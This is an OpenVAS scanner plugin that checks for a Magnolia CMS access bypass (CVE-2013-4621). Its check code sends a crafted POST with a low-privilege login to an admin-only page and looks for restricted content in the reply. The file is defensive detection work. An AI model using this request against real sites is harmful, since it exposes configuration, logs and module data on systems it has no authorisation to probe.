###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_magnolia_access_bypass_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Magnolia CMS Access Bypass Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to bypass certain security
  restrictions, obtain sensitive information and perform unauthorized actions.
  Impact Level: Application";

tag_affected = "Magnolia CMS version 4.5.8 and prior";
tag_insight = "The flaw allows non-administrator users to view contents from
  magnoliaPublic/.magnolia/log4j, /pages/logViewer.html,
  /pages/configuration.html, /pages/sendMail.html, /pages/permission.html,
  /pages/installedModulesList.html, and /pages/jcrUtils.html pages.";
tag_solution = "Upgrade to Magnolia CMS 4.5.9 or later,
  For updates refer to http://www.magnolia-cms.com";
tag_summary = "This host is running Magnolia CMS and is prone to access bypass
  vulnerability.";

if(description)
{
  script_id(803679);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-4621");
  script_bugtraq_id(60761);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-07-01 10:09:04 +0530 (Mon, 01 Jul 2013)");
  script_name("Magnolia CMS Access Bypass Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/94547");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Jun/202");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/magnolia-cms-458-access-bypass");
  script_summary("Check for access bypass vulnerability in Magnolia CMS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

# Variable Initialization
port = "";
host = "";
req = "";
res = "";
url = "";
postdata = "";
sndReq = "";
rcvRes = "";
c = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
 port = 8080;
}

## Check the port status
if(!get_port_state(port)){
 exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

req = http_get(item:string("/magnoliaPublic/.magnolia/pages/adminCentral.html"), port:port);
res = http_send_recv(port:port, data:req);

## Confirm application
if(">Magnolia" >< res && ">Magnolia International Ltd" >< res)
{
  ## Construct the attack request
  url = "/magnoliaPublic/.magnolia/pages/installedModulesList.html ";
  Postdata = "mgnlUserId=eric&mgnlUserPSWD=eric";
  sndReq = string("POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host,"\r\n",
                  "Referer: http://", host, url, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ",strlen(Postdata), "\r\n\r\n",
                  Postdata);

  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Check response and confirm the exploit
  if(rcvRes && ">Installed modules" >< rcvRes && "Name" >< rcvRes &&
               "Description" >< rcvRes)
  {
    security_hole(port:port);
    exit(0);
  }
}
